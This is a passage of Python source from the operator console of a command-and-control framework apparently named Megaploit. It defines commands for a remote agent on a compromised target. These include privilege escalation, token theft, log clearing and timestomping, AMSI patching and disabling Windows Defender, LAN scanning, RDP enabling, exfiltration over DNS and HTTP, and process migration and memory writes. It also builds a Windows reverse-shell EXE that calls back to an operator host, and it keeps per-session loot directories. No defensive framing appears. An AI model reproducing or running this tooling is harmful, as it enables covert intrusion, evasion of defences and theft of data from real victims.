        return _err(f"clip_watch failed: {e}")
    finally:
        session.conn.settimeout(old_timeout)


# ---------------------------------------------------------------------------
# GUI & interaction
# ---------------------------------------------------------------------------

@_cmd("screenshot_region", usage="screenshot_region <x> <y> <w> <h>",
      help_text="Capture a specific screen region on the target and pull it back")
def cmd_screenshot_region(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 4 or not all(a.isdigit() for a in args):
        return _err("Usage: screenshot_region <x> <y> <width> <height>")
    local = session.screenshot_path()
    send_msg(session.conn, f"screenshot_region {' '.join(args)}")
    err = _recv_file_or_err(session.conn, local, timeout=20)
    if err:
        return err
    return _ok(f"[+] Region screenshot saved: {local}")


@_cmd("notify", usage="notify <title> <message>",
      help_text="Show a system tray / desktop notification on the target (silent)")
def cmd_notify(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: notify <title> <message>")
    send_msg(session.conn, "notify " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("open_url", usage="open_url <url>",
      help_text="Silently open a URL in the target's default browser")
def cmd_open_url(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: open_url <url>")
    send_msg(session.conn, f"open_url {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("play_sound", usage="play_sound <remote_wav_path>",
      help_text="Play a WAV file through the target's audio output")
def cmd_play_sound(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: play_sound <remote_wav_path>")
    send_msg(session.conn, f"play_sound {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("set_wallpaper", usage="set_wallpaper <remote_image_path>",
      help_text="Change the desktop wallpaper on the target to any image already on disk")
def cmd_set_wallpaper(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: set_wallpaper <remote_image_path>")
    send_msg(session.conn, f"set_wallpaper {args[0]}")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Token & privilege utilities
# ---------------------------------------------------------------------------

@_cmd("whoami_priv", usage="whoami_priv",
      help_text="List all privileges for the current token (Windows: whoami /priv)")
def cmd_whoami_priv(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "whoami_priv")
    return _ok(recv_msg(session.conn))


@_cmd("make_token", usage="make_token <username> <domain> <password>",
      help_text="Create a logon token for another user without starting a new process",
      dangerous=True)
def cmd_make_token(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 3:
        return _err("Usage: make_token <username> <domain> <password>")
    send_msg(session.conn, "make_token " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("rev2self", usage="rev2self",
      help_text="Revert to the original process token (undo make_token / token_steal)")
def cmd_rev2self(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "rev2self")
    return _ok(recv_msg(session.conn))


@_cmd("getsystem", usage="getsystem",
      help_text="Attempt automated local privilege escalation to SYSTEM/root",
      dangerous=True)
def cmd_getsystem(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "getsystem")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Evasion & anti-forensics
# ---------------------------------------------------------------------------

@_cmd("timestomp", usage="timestomp <remote_path> <reference_path>",
      help_text="Copy MAC timestamps from <reference_path> onto <remote_path>",
      dangerous=True)
def cmd_timestomp(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: timestomp <remote_path> <reference_path>")
    send_msg(session.conn, "timestomp " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("clear_logs", usage="clear_logs [windows|linux|all]",
      help_text="Clear Windows Event Logs or Linux syslog/auth/bash_history",
      dangerous=True)
def cmd_clear_logs(session: Session, args: list[str]) -> CommandResult:
    target = args[0].lower() if args else "all"
    if target not in ("windows", "linux", "all"):
        return _err("Usage: clear_logs [windows|linux|all]")
    send_msg(session.conn, f"clear_logs {target}")
    return _ok(recv_msg(session.conn))


@_cmd("patch_amsi", usage="patch_amsi",
      help_text="Patch AMSI in the current process to bypass Windows Defender scanning",
      dangerous=True)
def cmd_patch_amsi(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "patch_amsi")
    return _ok(recv_msg(session.conn))


@_cmd("disable_defender", usage="disable_defender",
      help_text="Disable Windows Defender real-time protection via registry (needs admin)",
      dangerous=True)
def cmd_disable_defender(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "disable_defender")
    return _ok(recv_msg(session.conn))


@_cmd("hide_file", usage="hide_file <remote_path>",
      help_text="Set hidden+system attributes on a file on the target (Windows)")
def cmd_hide_file(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: hide_file <remote_path>")
    send_msg(session.conn, f"hide_file {args[0]}")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Lateral movement helpers
# ---------------------------------------------------------------------------

@_cmd("ping_sweep", usage="ping_sweep <cidr>",
      help_text="ICMP ping sweep over a CIDR range from the target (maps LAN)")
def cmd_ping_sweep(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: ping_sweep <cidr>  e.g.  ping_sweep 192.168.1.0/24")
    send_msg(session.conn, f"ping_sweep {args[0]}")
    old = session.conn.gettimeout()
    session.conn.settimeout(120)
    try:
        return _ok(recv_msg(session.conn))
    except Exception as e:
        return _err(f"ping_sweep error: {e}")
    finally:
        session.conn.settimeout(old)


@_cmd("smb_shares", usage="smb_shares <host>",
      help_text="List SMB shares exposed by a host reachable from the target")
def cmd_smb_shares(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: smb_shares <host>")
    send_msg(session.conn, f"smb_shares {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("ssh_connect", usage="ssh_connect <user> <host> [port]",
      help_text="Open an SSH connection from the target to another host (uses agent's key store)")
def cmd_ssh_connect(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: ssh_connect <user> <host> [port]")
    send_msg(session.conn, "ssh_connect " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("rdp_enable", usage="rdp_enable",
      help_text="Enable Remote Desktop on the target and open firewall rule (Windows, needs admin)",
      dangerous=True)
def cmd_rdp_enable(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "rdp_enable")
    return _ok(recv_msg(session.conn))


# ---------------------------------------------------------------------------
# Exfiltration
# ---------------------------------------------------------------------------

@_cmd("exfil_dns", usage="exfil_dns <remote_file> <domain>",
      help_text="Exfiltrate a small file via DNS TXT queries to operator-controlled domain")
def cmd_exfil_dns(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: exfil_dns <remote_file> <domain>")
    send_msg(session.conn, "exfil_dns " + " ".join(args))
    old = session.conn.gettimeout()
    session.conn.settimeout(60)
    try:
        return _ok(recv_msg(session.conn))
    except Exception as e:
        return _err(f"exfil_dns error: {e}")
    finally:
        session.conn.settimeout(old)


@_cmd("exfil_http", usage="exfil_http <remote_file> <url>",
      help_text="POST a file from the target to an HTTP endpoint (curl/wget fallback)")
def cmd_exfil_http(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: exfil_http <remote_file> <url>")
    send_msg(session.conn, "exfil_http " + " ".join(args))
    old = session.conn.gettimeout()
    session.conn.settimeout(60)
    try:
        return _ok(recv_msg(session.conn))
    except Exception as e:
        return _err(f"exfil_http error: {e}")
    finally:
        session.conn.settimeout(old)


# ---------------------------------------------------------------------------
# Operator-side loot helpers (no agent round-trip)
# ---------------------------------------------------------------------------

@_cmd("loot_list", usage="loot_list",
      help_text="Show all files collected from this session in the loot directory")
def cmd_loot_list(session: Session, args: list[str]) -> CommandResult:
    loot_dir = session.loot_dir()
    if not os.path.isdir(loot_dir):
        return _ok(f"[*] No loot collected yet for session #{session.id}")
    files = []
    for root, _dirs, fnames in os.walk(loot_dir):
        for fname in sorted(fnames):
            full = os.path.join(root, fname)
            size = os.path.getsize(full)
            rel  = os.path.relpath(full, loot_dir)
            files.append(f"  {rel:<48} {size:>10,} B")
    if not files:
        return _ok(f"[*] Loot directory is empty: {loot_dir}")
    header = f"[+] Loot for session #{session.id}  ({loot_dir})\n"
    return _ok(header + "\n".join(files))


@_cmd("note", usage="note <text>",
      help_text="Append a timestamped operator note to this session's notes file")
def cmd_note(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: note <text>")
    text = " ".join(args)
    notes_path = os.path.join(session.loot_dir(), "notes.txt")
    os.makedirs(session.loot_dir(), exist_ok=True)
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
    with open(notes_path, "a", encoding="utf-8") as fh:
        fh.write(f"[{ts}] {text}\n")
    return _ok(f"Note saved to {notes_path}")


@_cmd("notes", usage="notes",
      help_text="Show all operator notes for this session")
def cmd_notes(session: Session, args: list[str]) -> CommandResult:
    notes_path = os.path.join(session.loot_dir(), "notes.txt")
    if not os.path.isfile(notes_path):
        return _ok(f"[*] No notes for session #{session.id}")
    with open(notes_path, "r", encoding="utf-8") as fh:
        content = fh.read()
    return _ok(content if content.strip() else "[*] Notes file is empty")


# ---------------------------------------------------------------------------
# C-remote-shell payload generation
# ---------------------------------------------------------------------------

@_cmd("generate_c",
      usage="generate_c <lhost> <lport> [output_path]",
      help_text="Build a C-remote-shell Windows EXE using the current session's secret key")
def cmd_generate_c(session: Session, args: list[str]) -> CommandResult:
    """
    Compile the C-remote-shell client into a Windows EXE, embedding the
    current secret key, lhost, and lport directly into the binary.

    The resulting EXE:
      - Connects back to <lhost>:<lport>
      - Speaks full Megaploit TLS 1.2/1.3 + HMAC-SHA256 + AES-GCM protocol
      - Supports: exit, sysinfo, cd, upload, download, persist, self_destruct,
                  forceoff, bluescreen, and all shell commands via _popen()

    Requires cl.exe (MSVC) or x86_64-w64-mingw32-gcc (MinGW) in PATH.

    Examples:
      generate_c 10.0.0.1 4444
      generate_c 10.0.0.1 4444 /tmp/agent.exe
    """
    if len(args) < 2:
        return _err("Usage: generate_c <lhost> <lport> [output_path]")

    lhost = args[0]
    try:
        lport = int(args[1])
    except ValueError:
        return _err("[-] lport must be an integer")

    output_path = args[2] if len(args) >= 3 else ""

    try:
        from megaploit.payload.builder import builder, BuildConfig, OutputFormat
        from megaploit.core.crypto import load_key
        from megaploit.core.c_probe import probe, format_report
    except ImportError as e:
        return _err(f"[-] Import error: {e}")

    # ── Run C2 compliance probe on the source tree before building ─────────
    here    = os.path.dirname(os.path.abspath(__file__))
    c_root  = os.path.normpath(os.path.join(here, "..", "..", "C-remote-shell"))
    probe_lines = ""
    if os.path.isdir(c_root):
        pr = probe(c_root)
        probe_lines = format_report(pr)
        if not pr.compliant:
            # Show the report and refuse to build
            return _err(
                "[-] C source tree failed C2 compliance probe — "
                "build aborted.\n" + probe_lines
            )

    # Load the shared secret so the generated binary authenticates correctly
    try:
        secret_key = load_key("secret.key")
    except SystemExit:
        return _err("[-] secret.key not found — generate one first")

    cfg = BuildConfig(
        lhost=lhost,
        lport=lport,
        format=OutputFormat.C_EXE,
        use_tls=True,
        secret_key=secret_key,
        output_path=output_path,
        name="megaploit_c_agent",
    )

    result = builder.build(cfg)
    if not result.ok:
        return _err(f"[-] Build failed: {result.error}")

    _audit(session, f"generate_c {lhost}:{lport}", True)
    return _ok(
        probe_lines
        + f"[+] C-agent built: {result.output_path}\n"
        f"    Size:   {result.size:,} bytes\n"
        f"    SHA256: {result.sha256}\n"
        f"    Time:   {result.build_time_s:.1f}s\n"
        f"\n"
        f"    Deploy to target and run — it will call back to {lhost}:{lport}"
    )


@_cmd("tag", usage="tag <label>",
      help_text="Tag this session with a label (stored in loot dir, shown in sessions list)")
def cmd_tag(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: tag <label>")
    label = " ".join(args)
    tag_path = os.path.join(session.loot_dir(), ".tag")
    os.makedirs(session.loot_dir(), exist_ok=True)
    with open(tag_path, "w", encoding="utf-8") as fh:
        fh.write(label)
    session.tag = label          # set in-memory attribute for prompt display
    return _ok(f"Session #{session.id} tagged: {label}")


# ---------------------------------------------------------------------------
# Toolbox
# ---------------------------------------------------------------------------

@_cmd("toolbox_run", usage="toolbox_run <name> [args…]",
      help_text="Run an installed toolbox tool locally, targeting the active session's IP")
def cmd_toolbox_run(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: toolbox_run <tool-name> [args…]")
    lines: list[str] = []
    try:
        _runner.run_local(args[0], args[1:], output=lines.append)
    except RuntimeError as e:
        return _err(str(e))
    return _ok("\n".join(lines))


@_cmd("toolbox_deploy", usage="toolbox_deploy <name> [args…]",
      help_text="Upload a toolbox tool's entry-point to the target and execute it there")
def cmd_toolbox_deploy(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: toolbox_deploy <tool-name> [args…]")
    lines: list[str] = []
    try:
        _runner.run_remote(args[0], args[1:], session, output=lines.append)
    except RuntimeError as e:
        return _err(str(e))
    return _ok("\n".join(lines))


# ---------------------------------------------------------------------------
# Public API — used by cli.py and tests
# ---------------------------------------------------------------------------

def dispatch(session: Session, raw: str) -> CommandResult:
    """
    Parse *raw* into a command name + args and invoke the matching handler.

    Unknown commands are forwarded as raw shell commands to the agent
    (the shell-fallback behaviour described in the module docstring).
    The audit log entry is always written.
    """
    parts = raw.strip().split()
    if not parts:
        return _ok()

    name = parts[0].lower()
    args = parts[1:]

    if name in _registry:
        try:
            result = _registry[name].handler(session, args)
        except ConnectionError:
            result = CommandResult(ok=False, output="[-] Connection lost.", close_session=True)
        except Exception as e:
            result = _err(f"[-] Error: {e}")
    else:
        # Shell fallback — forward raw string to the agent unchanged
        try:
            send_msg(session.conn, raw)
            result = _ok(recv_msg(session.conn))
        except ConnectionError:
            result = CommandResult(ok=False, output="[-] Connection lost.", close_session=True)
        except Exception as e:
            result = _err(f"[-] Error: {e}")

    _audit(session, raw, result.ok)
    return result



# ---------------------------------------------------------------------------
# Advanced Meterpreter-class commands
# ---------------------------------------------------------------------------

@_cmd("migrate", usage="migrate <pid>",
      help_text="Migrate the agent into another running process",
      dangerous=True)
def cmd_migrate(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: migrate <pid>")
    send_msg(session.conn, f"migrate {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("memory_read", usage="memory_read <pid> <hex_addr> <size>",
      help_text="Read bytes from a remote process's virtual memory (Windows)",
      dangerous=True)
def cmd_memory_read(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 3:
        return _err("Usage: memory_read <pid> <hex_addr> <size>")
    send_msg(session.conn, "memory_read " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("memory_write", usage="memory_write <pid> <hex_addr> <base64_data>",
      help_text="Write base64-encoded bytes into a remote process's virtual memory (Windows)",
      dangerous=True)
def cmd_memory_write(session: Session, args: list[str]) -> CommandResult:
    if len(args) != 3:
        return _err("Usage: memory_write <pid> <hex_addr> <base64_data>")
    send_msg(session.conn, "memory_write " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("port_scan", usage="port_scan <host> <ports>",
      help_text="TCP connect-scan ports from the target's perspective  e.g. port_scan 10.0.0.1 22,80,443,8080-8090")
def cmd_port_scan(session: Session, args: list[str]) -> CommandResult:
    if len(args) < 2:
        return _err("Usage: port_scan <host> <port_range>")
    send_msg(session.conn, "port_scan " + " ".join(args))
    old = session.conn.gettimeout()
    session.conn.settimeout(120)
    try:
        return _ok(recv_msg(session.conn))
    except Exception as e:
        return _err(f"port_scan timed out: {e}")
    finally:
        session.conn.settimeout(old)


@_cmd("run_psh", usage="run_psh <command>",
      help_text="Execute a PowerShell one-liner on the target (Windows only)",
      dangerous=True)
def cmd_run_psh(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: run_psh <command>")
    send_msg(session.conn, "run_psh " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("run_python", usage="run_python <code>",
      help_text="Execute Python code inside the agent's interpreter",
      dangerous=True)
def cmd_run_python(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: run_python <code>")
    send_msg(session.conn, "run_python " + " ".join(args))
    return _ok(recv_msg(session.conn))


@_cmd("load_extension", usage="load_extension <path_or_module>",
      help_text="Import a Python extension module into the agent at runtime")
def cmd_load_extension(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: load_extension <path_or_module>")
    send_msg(session.conn, f"load_extension {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("unload_extension", usage="unload_extension <module_name>",
      help_text="Remove a previously loaded extension from the agent")
def cmd_unload_extension(session: Session, args: list[str]) -> CommandResult:
    if not args:
        return _err("Usage: unload_extension <module_name>")
    send_msg(session.conn, f"unload_extension {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("list_extensions", usage="list_extensions",
      help_text="Show all dynamic extensions currently loaded into the agent")
def cmd_list_extensions(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "list_extensions")
    return _ok(recv_msg(session.conn))


@_cmd("screenshot_stream", usage="screenshot_stream <count> [fps]",
      help_text="Pull a rapid burst of JPEG screenshots over the C2 channel")
def cmd_screenshot_stream(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: screenshot_stream <count> [fps]")
    count   = int(args[0])
    fps     = int(args[1]) if len(args) > 1 and args[1].isdigit() else 5
    send_msg(session.conn, f"screenshot_stream {count} {fps}")

    loot_dir    = session.loot_dir()
    frames_dir  = os.path.join(loot_dir, "stream")
    os.makedirs(frames_dir, exist_ok=True)

    import base64 as _b64
    frames_saved = 0
    old_to = session.conn.gettimeout()
    session.conn.settimeout(count / fps + 15)
    try:
        while True:
            msg = recv_msg(session.conn)
            if msg == "STREAM_END":
                break
            if isinstance(msg, str) and msg.startswith("FRAME:"):
                data  = _b64.b64decode(msg[6:])
                fname = os.path.join(frames_dir, f"frame_{frames_saved:04d}.jpg")
                with open(fname, "wb") as f:
                    f.write(data)
                frames_saved += 1
    except Exception as e:
        return _err(f"stream error after {frames_saved} frames: {e}")
    finally:
        session.conn.settimeout(old_to)
    return _ok(f"[+] {frames_saved} frames saved to {frames_dir}")


@_cmd("whoami", usage="whoami",
      help_text="Current user + privilege level on the target")
def cmd_whoami(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "whoami")
    return _ok(recv_msg(session.conn))


@_cmd("getpid", usage="getpid",
      help_text="Return the agent's own PID")
def cmd_getpid(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "getpid")
    return _ok(recv_msg(session.conn))


@_cmd("getuid", usage="getuid",
      help_text="Return UID / domain\\user on the target")
def cmd_getuid(session: Session, args: list[str]) -> CommandResult:
    send_msg(session.conn, "getuid")
    return _ok(recv_msg(session.conn))


@_cmd("sleep", usage="sleep <seconds>",
      help_text="Put the agent to sleep for N seconds (operator-controlled jitter)")
def cmd_sleep(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: sleep <seconds>")
    secs = int(args[0])
    send_msg(session.conn, f"sleep {secs}")
    old = session.conn.gettimeout()
    session.conn.settimeout(secs + 10)
    try:
        return _ok(recv_msg(session.conn))
    except Exception as e:
        return _err(f"sleep error: {e}")
    finally:
        session.conn.settimeout(old)


@_cmd("beacon_sleep", usage="beacon_sleep <seconds>",
      help_text="Adjust the agent's beacon reconnect interval")
def cmd_beacon_sleep(session: Session, args: list[str]) -> CommandResult:
    if not args or not args[0].isdigit():
        return _err("Usage: beacon_sleep <seconds>")
    send_msg(session.conn, f"beacon_sleep {args[0]}")
    return _ok(recv_msg(session.conn))


@_cmd("interactive", usage="interactive",
      help_text="Drop into a real PTY shell session on the target (Ctrl-C to detach)")
def cmd_interactive(session: Session, args: list[str]) -> CommandResult:
    """Handled by MeterpreterSession.interact() — this stub allows CLI fallback."""
    send_msg(session.conn, "pty_shell")
    return _ok(recv_msg(session.conn))


def all_commands() -> dict[str, _CommandDef]:
    """Return a snapshot of the command registry (name → _CommandDef)."""
    return dict(_registry)


